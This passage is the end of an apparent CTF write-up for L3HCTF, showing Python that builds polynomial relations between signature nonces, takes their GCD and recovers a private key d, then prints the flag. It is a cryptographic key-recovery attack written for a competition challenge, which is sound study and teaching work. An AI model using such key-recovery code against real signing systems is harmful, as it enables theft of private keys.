</span></span><span class=line><span class=cl>        <span class=n>num_part2</span> <span class=o>=</span> <span class=n>poly_mul</span><span class=p>(</span><span class=n>p21</span><span class=p>,</span> <span class=n>p21</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>poly_sub</span><span class=p>(</span><span class=n>num_part1</span><span class=p>,</span> <span class=n>num_part2</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>get_poly_for_a_denominator</span><span class=p>(</span><span class=n>k_p0</span><span class=p>,</span> <span class=n>k_p1</span><span class=p>,</span> <span class=n>k_p2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=c1># 分母: (k_2 - k_0)*(k_2 - k_1)*(k_1 - k_0)</span>
</span></span><span class=line><span class=cl>        <span class=n>p20</span> <span class=o>=</span> <span class=n>poly_sub</span><span class=p>(</span><span class=n>k_p2</span><span class=p>,</span> <span class=n>k_p0</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>p21</span> <span class=o>=</span> <span class=n>poly_sub</span><span class=p>(</span><span class=n>k_p2</span><span class=p>,</span> <span class=n>k_p1</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>p10</span> <span class=o>=</span> <span class=n>poly_sub</span><span class=p>(</span><span class=n>k_p1</span><span class=p>,</span> <span class=n>k_p0</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>den_part1</span> <span class=o>=</span> <span class=n>poly_mul</span><span class=p>(</span><span class=n>p20</span><span class=p>,</span> <span class=n>p21</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>poly_mul</span><span class=p>(</span><span class=n>den_part1</span><span class=p>,</span> <span class=n>p10</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 得到第一组方程：a(k0..k3) = a(k1..k4)</span>
</span></span><span class=line><span class=cl>    <span class=n>num1</span> <span class=o>=</span> <span class=n>get_poly_for_a_numerator</span><span class=p>(</span><span class=n>k_polys</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>k_polys</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>k_polys</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=n>k_polys</span><span class=p>[</span><span class=mi>3</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>den1</span> <span class=o>=</span> <span class=n>get_poly_for_a_denominator</span><span class=p>(</span><span class=n>k_polys</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>k_polys</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>k_polys</span><span class=p>[</span><span class=mi>2</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>num2</span> <span class=o>=</span> <span class=n>get_poly_for_a_numerator</span><span class=p>(</span><span class=n>k_polys</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>k_polys</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=n>k_polys</span><span class=p>[</span><span class=mi>3</span><span class=p>],</span> <span class=n>k_polys</span><span class=p>[</span><span class=mi>4</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>den2</span> <span class=o>=</span> <span class=n>get_poly_for_a_denominator</span><span class=p>(</span><span class=n>k_polys</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>k_polys</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=n>k_polys</span><span class=p>[</span><span class=mi>3</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 方程为 num1*den2 - num2*den1 = 0</span>
</span></span><span class=line><span class=cl>    <span class=n>poly1</span> <span class=o>=</span> <span class=n>poly_sub</span><span class=p>(</span><span class=n>poly_mul</span><span class=p>(</span><span class=n>num1</span><span class=p>,</span> <span class=n>den2</span><span class=p>,</span> <span class=n>n</span><span class=p>),</span> <span class=n>poly_mul</span><span class=p>(</span><span class=n>num2</span><span class=p>,</span> <span class=n>den1</span><span class=p>,</span> <span class=n>n</span><span class=p>),</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 得到第二组方程：a(k1..k4) = a(k2..k5)</span>
</span></span><span class=line><span class=cl>    <span class=n>num3</span> <span class=o>=</span> <span class=n>get_poly_for_a_numerator</span><span class=p>(</span><span class=n>k_polys</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=n>k_polys</span><span class=p>[</span><span class=mi>3</span><span class=p>],</span> <span class=n>k_polys</span><span class=p>[</span><span class=mi>4</span><span class=p>],</span> <span class=n>k_polys</span><span class=p>[</span><span class=mi>5</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>den3</span> <span class=o>=</span> <span class=n>get_poly_for_a_denominator</span><span class=p>(</span><span class=n>k_polys</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=n>k_polys</span><span class=p>[</span><span class=mi>3</span><span class=p>],</span> <span class=n>k_polys</span><span class=p>[</span><span class=mi>4</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 方程为 num2*den3 - num3*den2 = 0</span>
</span></span><span class=line><span class=cl>    <span class=n>poly2</span> <span class=o>=</span> <span class=n>poly_sub</span><span class=p>(</span><span class=n>poly_mul</span><span class=p>(</span><span class=n>num2</span><span class=p>,</span> <span class=n>den3</span><span class=p>,</span> <span class=n>n</span><span class=p>),</span> <span class=n>poly_mul</span><span class=p>(</span><span class=n>num3</span><span class=p>,</span> <span class=n>den2</span><span class=p>,</span> <span class=n>n</span><span class=p>),</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 5. 计算两个多项式的最大公约数（GCD）</span>
</span></span><span class=line><span class=cl>    <span class=n>gcd_poly</span> <span class=o>=</span> <span class=n>poly_gcd</span><span class=p>(</span><span class=n>poly1</span><span class=p>,</span> <span class=n>poly2</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 6. 从 GCD 中提取根</span>
</span></span><span class=line><span class=cl>    <span class=c1># GCD 应该是一个一次多项式，形如 c1*d + c0</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>gcd_poly</span><span class=p>)</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>c1</span> <span class=o>=</span> <span class=n>gcd_poly</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>c0</span> <span class=o>=</span> <span class=n>gcd_poly</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># d = -c0 * c1_inv mod n</span>
</span></span><span class=line><span class=cl>        <span class=n>c1_inv</span> <span class=o>=</span> <span class=n>mod_inverse</span><span class=p>(</span><span class=n>c1</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>d</span> <span class=o>=</span> <span class=p>(</span><span class=o>-</span><span class=n>c0</span> <span class=o>*</span> <span class=n>c1_inv</span><span class=p>)</span> <span class=o>%</span> <span class=n>n</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Private key d found: </span><span class=si>{</span><span class=n>d</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Flag: L3HCTF</span><span class=se>&#123;&#123;</span><span class=si>{</span><span class=n>d</span><span class=si>}</span><span class=se>&#125;&#125;</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Failed to find a linear GCD polynomial. Something went wrong.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><div class=blog-tags><a href=https://su-team.cn/tags/l3hctf/>L3HCTF</a>&nbsp;</div>
